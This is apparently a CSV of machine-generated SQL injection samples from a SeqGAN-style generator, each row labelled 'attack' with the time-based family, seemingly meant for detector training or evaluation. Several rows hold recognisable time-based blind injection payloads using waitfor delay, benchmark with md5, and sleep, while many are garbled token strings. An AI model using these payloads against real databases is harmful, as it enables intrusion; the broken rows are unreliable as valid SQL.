label,payload,family,payload_type,method,run_id,sample_index
attack,ot  )   or    (  select 8514  (a  w  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,468
attack,  )   and    (()        )    (    (  (  select ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,469
attack,"1""   )    'wyvx'    )    ((  =  )   )    as",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,470
attack,1'+  (  select 'p' where 1241  =  1241 waitfor delay 'tjx(  u(  3114   or from --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,471
attack,    )   sleep  ) from 7305  =  (     (  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,472
attack,1%xe)    )    ae    )     asaw vand,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,473
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ''  )   waitfor delay '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,474
attack, 6793  =  )    (  sleep  )lkth  lie,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,475
attack, elikey  =  1568  where pg_sleep  5  )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,476
attack,1m  =    (  5q {    (  m     (  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,477
attack,5rotafs1hsinixikelwhereh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,478
attack,"""wucy"") where   (  =  benchmark  (  0  )   (  1210",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,479
attack,"  ""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   "") where 1679  =  =  =  6967  select from  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,480
attack,1'||  (  select 'ooonsyaw  benchmark where  select  (  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,481
attack,  l  )   r)    as)   '  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,482
attack,"1 where   (     )   (   =  (  ),  =   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,483
attack,1%kx' where 1241  =  1241 waitfor delay '0:0:5' and   (  'l30:0:' and   (  ':0,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,484
attack,1 )   and     (  k  =  )       )    (  5,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,485
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ln where  =  5000000sleep  =  m  likemd  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,486
attack, )   elt    (    (       1210(  =  select   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,487
attack,1'   )    )     )   waitfor delay '   sleep  )   )   (  =  )   or   or from,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,488
attack,1'   )    )    as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,489
attack,select from(  m  =    (  (  )   (  benchmark  =,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,490
attack,1 (  (  )   rlioel  (  or  =,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,491
attack,1'||  (  select ''   )    )    (     (  benchmark  (    )   b,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,492
attack,"1'   asw'  =  'fsowksoe""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""nita",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,493
attack,1  )   or j  *    (  1568  )   where (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,494
attack,15'+  (  select 'hyn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,495
attack,"1"" from   a w  5  )   where 3824  benchmark  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,496
attack,1 where 6175  select ) 4240 *  8507  =  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,497
attack,"1""""  )    )    )    (  )   (     (    5",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,498
attack,1md5  (  sleep  )   )    (  (  select ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,499
